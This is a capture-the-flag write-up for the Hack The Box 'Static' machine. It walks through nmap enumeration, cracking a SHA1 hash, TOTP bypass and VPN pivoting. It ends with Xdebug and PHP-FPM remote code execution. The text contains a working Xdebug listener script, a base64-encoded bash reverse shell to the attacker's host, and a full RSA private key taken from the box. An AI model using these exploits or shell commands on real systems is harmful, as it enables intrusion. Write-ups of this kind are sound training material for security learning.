---
title: Static - Hack the Box Write-Up
published: true
image: media/static/static.png
---
**Difficulty**: Hard. **OS**: Linux.

As the difficulty of this box may suggest there is a lot of topics going on in the resolution, like: Pivoting, Networking topics, 2FA, C, etc. I have learned a lot in this box, specially in the pivoting and networking stuff.

Let's get into it

### Intrusion

We start as always with recognize and enumeration phase. The IP address of the victim’s machine is 10.10.10.246.

```console
elpollon@elpollon:~/HTB/Static/nmap$ nmap -p- --open --min-rate=5000 -Pn 10.10.10.246 -oG allPorts

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-30 07:37 -03
Initiating SYN Stealth Scan at 07:37
Scanning 10.10.10.246 [65535 ports]
SYN Stealth Scan Timing: About 50.00% done; ETC: 07:40 (0:01:39 remaining)
Discovered open port 22/tcp on 10.10.10.246
Discovered open port 8080/tcp on 10.10.10.246
Discovered open port 2222/tcp on 10.10.10.246
Stats: 0:01:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 50.00% done; ETC: 07:40 (0:01:39 remaining)
Completed SYN Stealth Scan at 07:40, 202.63s elapsed (65535 total ports)
Nmap scan report for 10.10.10.246
Host is up (0.39s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 202.74 seconds
           Raw packets sent: 131070 (5.767MB) | Rcvd: 7 (348B)
```

Ports 22, 2222, 8080 were found open. Let's check what's going on in these ports.

```console
elpollon@elpollon:~/HTB/Static/nmap$ nmap -sCV -p22,2222,8080 10.10.10.246 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-30 07:58 -03
Nmap scan report for vpn.static.htb (10.10.10.246)
Host is up (0.39s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.41 seconds
```
**http://10.10.10.246:8080/robots.txt** shows 2 disallowed entries in the http Apache server: 

- /vpn/

This redirects to an authentication panel in **http://10.10.10.246:8080/vpn/login.php**.

![](./media/Static/authentication-panel.png)

- /.ftp_uploads/

Two files hosted in this directory.

![](./media/Static/ftp-uploads.png)

Let's check **warning.txt**.

![](./media/Static/warning.png)

Let's check **db.sql.gz** file.

```console
elpollon@elpollon:~/HTB/Static/content$ wget http://10.10.10.246:8080/.ftp_uploads/db.sql.gz

--2021-11-30 08:54:52--  http://10.10.10.246:8080/.ftp_uploads/db.sql.gz
Connecting to 10.10.10.246:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 262 [application/x-gzip]
Saving to: ‘db.sql.gz’

db.sql.gz           100%[===================>]     262  --.-KB/s    in 0s      

2021-11-30 08:54:53 (8,17 MB/s) - ‘db.sql.gz’ saved [262/262]

elpollon@elpollon:~/HTB/Static/content$ gzip -d db.sql.gz

gzip: db.sql.gz: invalid compressed data--crc error

gzip: db.sql.gz: invalid compressed data--length error

```

I had an error while decompressing the **db.sql.gz** file, probably the warning file makes reference to this. Doing some research I found that the corruption of **db.sql.gz** may be because the file was upload over non ftp binary connection. The file can be decorrupted using **dos2unix** tool.

```console
elpollon@elpollon:~/HTB/Static/content$ dos2unix -f db.sql.gz

dos2unix: converting file db.sql.gz to Unix format...

elpollon@elpollon:~/HTB/Static/content$ gz -d db.sql.gz
elpollon@elpollon:~/HTB/Static/content$
```

No errors now, let's check what's going on in **db.sql** file.

```console
elpollon@elpollon:~/HTB/Static/content$ cat db.sql

CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); 
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

Ok, a database snapshot. We see a user and password (probably hashed). Let's try to crack the password using john.

```console
elpollon@elpollon:~/HTB/Static/content$ echo 'd033e22ae348aeb5660fc2140aec35850c4da997' > hash

elpollon@elpollon:~/HTB/Static/content$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 

Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)

elpollon@elpollon:~/HTB/Static/content$ john --show hash
?:admin

1 password hash cracked, 0 left
```

So now we have the ultra secure credentials **admin:admin**. Let's use it in the authentication panel on **http://10.10.10.246:8080/vpn/login.php**.

![](./media/Static/2fa.png)

The credentials were useful but now the panel requires 2FA to log in. The OTP is generated by a seed (secret key) and a moving factor (In this case, the time). I recommend this [article](https://www.onelogin.com/learn/otp-totp-hotp) to learn more about Time-based One Time Password (TOTP). See the image below for a more graphic schema.

![600x500](./media/Static/totp.png)

In the **db.sql** database snapshot was a **totp** column that could be the seed of the TOTP. To generate the OTP I used this [page](https://totp.danhersam.com/). The input paramaters that worked to log in was the seed, 6 digits of OTP and token period of 30 seconds. 

![](./media/Static/otp.png)

2FA by passed, now we see an IT support portal.

![](./media/Static/it-portal.png)

This application generates an **.ovpn** file to connect to an internal VPN. Let's generate **diamondjackson.ovpn**.

![](./media/Static/diamondjackson.png)

```console
elpollon@elpollon:~/HTB/Static/content$ openvpn diamondjackson.ovpn

2021-12-01 08:09:32 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-256-CBC' to --data-ciphers or change --cipher 'AES-256-CBC' to --data-ciphers-fallback 'AES-256-CBC' to silence this warning.
2021-12-01 08:09:32 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2021
2021-12-01 08:09:32 library versions: OpenSSL 1.1.1k  25 Mar 2021, LZO 2.10
2021-12-01 08:09:32 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2021-12-01 08:09:32 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2021-12-01 08:09:32 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known)
2021-12-01 08:09:32 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known)
2021-12-01 08:09:32 Could not determine IPv4/IPv6 protocol
2021-12-01 08:09:32 NOTE: UID/GID downgrade will be delayed because of --client, --pull, or --up-delay
2021-12-01 08:09:32 SIGUSR1[soft,init_instance] received, process restarting
2021-12-01 08:09:32 Restart pause, 5 second(s)
```

I had an error while connecting to the VPN. This was because the domain **vpn.static.htb** was not added to **/etc/hosts**, so must add it in order to connect.

```console
/etc/hosts file

# Host addresses
127.0.0.1  localhost
10.10.10.246    vpn.static.htb 
```

Now it can connect successfully.

```console
elpollon@elpollon:~/HTB/Static/content$ openvpn diamondjackson.ovpn

2021-12-01 08:17:09 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-256-CBC' to --data-ciphers or change --cipher 'AES-256-CBC' to --data-ciphers-fallback 'AES-256-CBC' to silence this warning.
2021-12-01 08:17:09 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2021
2021-12-01 08:17:09 library versions: OpenSSL 1.1.1k  25 Mar 2021, LZO 2.10
2021-12-01 08:17:09 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2021-12-01 08:17:09 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2021-12-01 08:17:09 TCP/UDP: Preserving recently used remote address: [AF_INET]10.10.10.246:1194
2021-12-01 08:17:09 Socket Buffers: R=[212992->212992] S=[212992->212992]
2021-12-01 08:17:09 UDP link local: (not bound)
2021-12-01 08:17:09 UDP link remote: [AF_INET]10.10.10.246:1194
2021-12-01 08:17:09 NOTE: UID/GID downgrade will be delayed because of --client, --pull, or --up-delay
2021-12-01 08:17:10 TLS: Initial packet from [AF_INET]10.10.10.246:1194, sid=66bdc2f4 834870ca
2021-12-01 08:17:10 VERIFY OK: depth=1, CN=static-gw
2021-12-01 08:17:10 VERIFY KU OK
2021-12-01 08:17:10 Validating certificate extended key usage
2021-12-01 08:17:10 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
2021-12-01 08:17:10 VERIFY EKU OK
2021-12-01 08:17:10 VERIFY OK: depth=0, CN=static-gw
2021-12-01 08:17:10 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, 2048 bit RSA
2021-12-01 08:17:10 [static-gw] Peer Connection Initiated with [AF_INET]10.10.10.246:1194
2021-12-01 08:17:12 SENT CONTROL [static-gw]: 'PUSH_REQUEST' (status=1)
2021-12-01 08:17:12 PUSH: Received control message: 'PUSH_REPLY,route 172.17.0.0 255.255.255.0,route-gateway 172.30.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 172.30.0.10 255.255.0.0,peer-id 0,cipher AES-256-GCM'
2021-12-01 08:17:12 OPTIONS IMPORT: timers and/or timeouts modified
2021-12-01 08:17:12 OPTIONS IMPORT: --ifconfig/up options modified
2021-12-01 08:17:12 OPTIONS IMPORT: route options modified
2021-12-01 08:17:12 OPTIONS IMPORT: route-related options modified
2021-12-01 08:17:12 OPTIONS IMPORT: peer-id set
2021-12-01 08:17:12 OPTIONS IMPORT: adjusting link_mtu to 1624
2021-12-01 08:17:12 OPTIONS IMPORT: data channel crypto options modified
2021-12-01 08:17:12 Data Channel: using negotiated cipher 'AES-256-GCM'
2021-12-01 08:17:12 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
2021-12-01 08:17:12 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
2021-12-01 08:17:12 net_route_v4_best_gw query: dst 0.0.0.0
2021-12-01 08:17:12 net_route_v4_best_gw result: via 192.168.1.1 dev eth0
2021-12-01 08:17:12 ROUTE_GATEWAY 192.168.1.1/255.255.255.0 IFACE=eth0 HWADDR=f4:30:b9:8f:cf:b1
2021-12-01 08:17:12 TUN/TAP device tun9 opened
2021-12-01 08:17:12 net_iface_mtu_set: mtu 1500 for tun9
2021-12-01 08:17:12 net_iface_up: set tun9 up
2021-12-01 08:17:12 net_addr_v4_add: 172.30.0.10/16 dev tun9
2021-12-01 08:17:12 net_route_v4_add: 172.17.0.0/24 via 172.30.0.1 dev [NULL] table 0 metric -1
2021-12-01 08:17:12 GID set to nogroup
2021-12-01 08:17:12 UID set to nobody
2021-12-01 08:17:12 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
2021-12-01 08:17:12 Initialization Sequence Completed
```

In the VPN my machine has 172.30.0.10 IP address associated with **tun9** interface.

```console
elpollon@elpollon:~/HTB/Static/content$ ifconfig

tun9: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 172.30.0.10  netmask 255.255.0.0  destination 172.30.0.10
        inet6 fe80::8748:251d:ccc6:6e17  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500
```

The VPN provides connection to **172.30.0.0/16** and **172.17.0.0/24** networks. I've used nmap to scan every host in these networks only finding the gateways with ssh servers exposed, but there was no pontentials vectors to gain access.

For now we can only ping to the **VPN** server showed on IT Support portal. If we try to ping some other online server like **web** and **db** we got no response.

```console
elpollon@elpollon:~/HTB/Static/content$ ping -c 1 172.30.0.1
PING 172.30.0.1 (172.30.0.1) 56(84) bytes of data.
64 bytes from 172.30.0.1: icmp_seq=1 ttl=64 time=156 ms

--- 172.30.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 155.610/155.610/155.610/0.000 ms

elpollon@elpollon:~/HTB/Static/content$ ping -c 1 172.20.0.10

PING 172.20.0.10 (172.20.0.10) 56(84) bytes of data.

--- 172.20.0.10 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

elpollon@elpollon:~/HTB/Static/content$ ping -c 1 172.20.0.11
PING 172.20.0.11 (172.20.0.11) 56(84) bytes of data.

--- 172.20.0.11 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

```

To get connectivity to **web** and **db** hosts that are within **172.20.0.0** network I've added a new static route using **tun9** device that connects to the vpn.

```console
elpollon@elpollon:~/HTB/Static/content$ ip route add 172.20.0.0/24 dev tun9
elpollon@elpollon:~/HTB/Static/content$ ping -c 1 172.20.0.10
PING 172.20.0.10 (172.20.0.10) 56(84) bytes of data.
64 bytes from 172.20.0.10: icmp_seq=1 ttl=63 time=139 ms

--- 172.20.0.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 139.221/139.221/139.221/0.000 ms

elpollon@elpollon:~/HTB/Static/content$ ping -c 1 172.20.0.11
PING 172.20.0.11 (172.20.0.11) 56(84) bytes of data.
64 bytes from 172.20.0.11: icmp_seq=1 ttl=63 time=277 ms

--- 172.20.0.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 277.097/277.097/277.097/0.000 ms
```

With a quick nmap scan I've found some ports open in the **web-db** hosts.

```console
elpollon@elpollon:~/HTB/Static/content$ nmap --open 172.20.0.10

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-01 08:59 -03
Nmap scan report for 172.20.0.10
Host is up (0.17s latency).
Not shown: 857 closed tcp ports (conn-refused), 141 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.10 seconds

elpollon@elpollon:~/HTB/Static/content$ nmap --open 172.20.0.11

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-01 08:59 -03
Nmap scan report for 172.20.0.11
Host is up (0.16s latency).
Not shown: 789 closed tcp ports (conn-refused), 210 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
  PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 5.29 seconds
```

Let's check the http server of the **web** host.

![](./media/Static/webhost.png)

**http://172.20.0.10/vpn/** runs the same application of **http://10.10.10.246:8080/vpn/**. **info.php** shows information of the current version of php and some configuration settings. We can see that a [php debug extention](https://xdebug.org/) is enabled. 

![](./media/Static/xdebug.png)

This extention could be vulnerable to RCE if has some specific configuration. If the extention is vulnerable, an attacker could send the parameter: **?XDEBUG_SESSION_START=phpstorm** via GET method and xdebug will send a debugger prompt to port 9000 of the attacker's machine.(Check this [article](https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/) to dig more about).

![](https://redshark1802.com/images/xpwn/dbgp-setup.gif)

In order to get a reverse shell from **web** host I made 3 things:

- Execute this python script (exploit_shell.py) written by [nqxcode](https://github.com/nqxcode) to get a debugger prompt. This will listen on port 9000.

```python
#!/usr/bin/env python2

import  socket 

ip_port = ('0.0.0.0', 9000) 
sk = socket.socket()
sk.bind(ip_port) 
sk.listen(10) 
conn, addr = sk.accept() 

while  True: 
    client_data = conn.recv(1024) 
    print(client_data) 

    data = raw_input ('>> ') 
    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
```

```console
elpollon@elpollon:~/HTB/Static/exploits$ python exploit_shell.py

```

- Using the parameter **?XDEBUG_START_SESSION=phpstorm** in the authentication panel of **http://172.20.0.10/vpn/login.php**

![](./media/Static/xdebug-session.png)

After some F5's I got a debug prompt on the terminal where I've executed **exploit_shell.py**.

```console
elpollon@elpollon:~/HTB/Static/exploits$ python exploit_shell.py
498<?xml version="1.0" encoding="iso-8859-1"?>
<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/vpn/login.php" language="PHP" xdebug:language_version="7.2.1-1ubuntu2" protocol_version="1.0" appid="49" idekey="phpstorm"><engine version="2.6.0"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2018 by Derick Rethans]]></copyright></init>
>> 
```

At this point we can execute php commands interactively.

- Listening on port 443 and execute the reverse shell payload:
**shell_exec('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMzAuMC45LzQ0MyAwPiYxCg==" | base64 -d | bash');** in the debug prompt.
```console
elpollon@elpollon:~/HTB/Static/exploits$ nc -nlvp
listening on [any] 443 ...
```

```console
elpollon@elpollon:~/HTB/Static/exploits$ python exploit_shell.py
498<?xml version="1.0" encoding="iso-8859-1"?>
<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/vpn/login.php" language="PHP" xdebug:language_version="7.2.1-1ubuntu2" protocol_version="1.0" appid="49" idekey="phpstorm"><engine version="2.6.0"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2018 by Derick Rethans]]></copyright></init>
>> shell_exec('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMzAuMC45LzQ0MyAwPiYxCg==" | base64 -d | bash'); 

```
Now we got the shell as **www-data** user.

```console
elpollon@elpollon:~/HTB/Static/exploits$ nc -nlvp
listening on [any] 443 ...
connect to [172.30.0.9] from (UNKNOWN) [172.30.0.1] 53776
bash: cannot set terminal process group (37): Inappropriate ioctl for device
bash: no job control in this shell
www-data@web:/var/www/html/vpn$ 
```

Intrusion done. We can see the user flag on **/home**.

```console
www-data@web:/var/www/html/vpn$ cd /home
cd /home
www-data@web:/home$ ls -l
ls -l
total 8
-rw-r--r-- 1 root     root       33 Apr  3  2020 user.txt
drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 www-data
www-data@web:/home$ cat user.txt	
cat user.txt 
c3f343befcac5fa92fb5373456e94247
www-data@web:/home$ 
```

### Privilege Escalation

I found an **id_rsa** in **/home/www-data/.ssh** directory. This was useful to connect via ssh to **web** host for a more stable shell.

```console
www-data@web:/home/www-data$ ls -la
ls -la
total 16
drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 .
drwxr-xr-x 3 root     root     4096 Jun 14 07:56 ..
lrwxrwxrwx 1 root     root        9 Jun 14 08:02 .bash_history -> /dev/null
drwx------ 2 www-data www-data 4096 Jun 14 08:00 .cache
drwx------ 2 www-data www-data 4096 Jun 14 07:54 .ssh
www-data@web:/home/www-data$ cd .ssh
cd .ssh
www-data@web:/home/www-data/.ssh$ ls -l
ls -l
total 12
-rw-r--r-- 1 www-data www-data  390 Jun 14 07:54 authorized_keys
-rw------- 1 www-data www-data 1675 Jun 14 07:34 id_rsa
-rw-r--r-- 1 www-data www-data  390 Jun 14 07:34 id_rsa.pub
www-data@web:/home/www-data/.ssh$ cat id_rsa	
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj
GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
+1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
-----END RSA PRIVATE KEY-----
www-data@web:/home/www-data/.ssh$ 
```

```console
elpollon@elpollon:~/HTB/Static/content$ chmod 600 id_rsa
elpollon@elpollon:~/HTB/Static/content$ ssh -i id_rsa www-data@172.20.0.10
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Jun 14 08:00:30 2021 from 10.10.14.4
www-data@web:~$ 
```

The root flag seems to not be in **web** host so it seems that a pivoting to other host will be necessary to escalate privileges. Let's check the web application on **/var/www/html/vpn**.

```console
www-data@web:~$ ls -l /var/www/html/vpn
total 28
-rw-r--r-- 1 root root  206 Mar 26  2020 actions.php
-rw-r--r-- 1 root root   94 Apr  5  2020 database.php
-rw-r--r-- 1 root root  121 Apr  6  2020 header.php
-rw-r--r-- 1 root root  160 Mar 26  2020 index.php
-rw-r--r-- 1 root root 2048 Jun 17  2020 login.php
-rw-r--r-- 1 root root 1457 Apr  6  2020 panel.php
drwxr-xr-x 2 root root 4096 Mar 25  2020 src
```

This is the php code of **panel.php**:

```php
<?php
require "header.php";

if($_SESSION['auth']!="GRANTED"){
	session_destroy();
	header("Location: index.php");
} else {
	if(isset($_POST['cn'])){
		$cn=preg_replace("/[^A-Za-z0-9 ]/", '',$_POST['cn']);
		header('Content-type: application/octet-stream');
		header('Content-Disposition: attachment; filename="'.$cn.'.ovpn"');
		$handle = curl_init();
 		$url = "http://pki/?cn=".$cn;
		curl_setopt($handle, CURLOPT_URL, $url);
		curl_setopt($handle, CURLOPT_RETURNTRANSFER, true); 
		$output = curl_exec($handle); 	
		curl_close($handle);
 		echo $output;
		die();
	}
?>
```

I found that the app, once the authentication is granted, it communicates with **pki** host to generate the **.ovpn** file in the IT Support portal. In fact, if I ping **pki** I have response from **192.168.254.3**.

```console
www-data@web:/var/www/html/vpn$ ping -c 1 pki
PING pki (192.168.254.3) 56(84) bytes of data.
64 bytes from pki.secret (192.168.254.3): icmp_seq=1 ttl=64 time=0.147 ms

--- pki ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.147/0.147/0.147/0.000 ms
```

**web** host doesn't have curl installed so I have to tunnelize the connection via ssh to dig more about the response headers of **pki**.

```console
elpollon@elpollon:~/HTB/Static/content$ ssh -i id_rsa -L 80:192.168.254.3:80 www-data@172.20.0.10
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Dec  8 22:07:47 2021 from 10.10.16.42
www-data@web:~$ 
```

```console
elpollon@elpollon:~/HTB/Static/content$ curl -v http://localhost
*   Trying ::1:80...
* Connected to localhost (::1) port 80 (#0)
> GET / HTTP/1.1
> Host: localhost
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)
< Date: Wed, 08 Dec 2021 22:13:37 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP-FPM/7.1
< 
batch mode: /usr/bin/ersatool create|print|revoke CN
* Connection #0 to host localhost left intact
```

[PHP-FPM](https://www.stackscale.com/blog/php-fpm-high-traffic-websites/) is enabled. This feature could be vulnerable to [Underflow RCE](https://www.rapid7.com/db/modules/exploit/multi/http/php_fpm_rce/) if has certain configuration. I've used this [exploit](https://github.com/neex/phuip-fpizdam/) from [neex](https://github.com/neex) written in go.

```console
elpollon@elpollon:~/HTB/Static/exploits$ git clone https://github.com/neex/phuip-fpizdam/
Cloning into 'phuip-fpizdam'...
remote: Enumerating objects: 137, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 137 (delta 11), reused 18 (delta 7), pack-reused 113
Receiving objects: 100% (137/137), 7.17 MiB | 9.23 MiB/s, done.
Resolving deltas: 100% (72/72), done.

elpollon@elpollon:~/HTB/Static/exploits$ cd phuip-fpizdam
elpollon@elpollon:~/HTB/Static/exploits$ go build .
elpollon@elpollon:~/HTB/Static/exploits$ ./phuid-fpizdam http://localhost/index.php
2021/12/08 19:41:35 Base status code is 200
2021/12/08 19:41:54 Status code 502 for qsl=1765, adding as a candidate
2021/12/08 19:42:08 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2021/12/08 19:42:16 Attack params found: --qsl 1755 --pisos 11 --skip-detect
2021/12/08 19:42:16 Trying to set "session.auto_start=0"...
2021/12/08 19:42:33 Detect() returned attack params: --qsl 1755 --pisos 11 --skip-detect <-- REMEMBER THIS
2021/12/08 19:42:33 Performing attack using php.ini settings...
2021/12/08 19:42:50 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2021/12/08 19:42:50 Trying to cleanup /tmp/a...
2021/12/08 19:42:51 Done!
```

The exploit has detected a vulnerable configuration. Now we can execute commands via **?a** parameter (Some tries will be needed!).
```console
elpollon@elpollon:~/HTB/Static/exploits$ curl http://localhost/index.php?a=whoami
www-data

